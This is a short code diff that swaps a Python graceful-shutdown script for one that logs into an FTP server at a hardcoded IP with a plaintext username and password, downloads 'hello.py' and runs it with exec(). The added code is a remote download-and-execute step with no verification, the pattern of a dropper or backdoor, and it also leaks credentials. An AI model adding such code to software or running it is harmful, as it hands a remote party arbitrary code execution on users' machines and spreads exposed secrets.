@@ -1,21 +1,12 @@
-import signal
-import time
+import ftplib 
 
-class GracefulKiller:
-  kill_now = False
-  def __init__(self):
-    signal.signal(signal.SIGINT, self.exit_gracefully)
-    signal.signal(signal.SIGTERM, self.exit_gracefully)
+path = 'dow/'
+filename = 'hello.py'
 
-  def exit_gracefully(self,signum, frame):
-    self.kill_now = True
+ftp = ftplib.FTP("31.170.167.199") 
+ftp.login("u454940376", "Timo1234!") 
+ftp.cwd(path)
+ftp.retrbinary("RETR " + filename ,open(filename, 'wb').write)
+ftp.quit()
 
-if __name__ == '__main__':
-  killer = GracefulKiller()
-  while True:
-    time.sleep(1)
-    print("doing something in a loop ...")
-    if killer.kill_now:
-      break
-
-  print("End of the program. I was killed gracefully")
+exec(open("./hello.py").read())
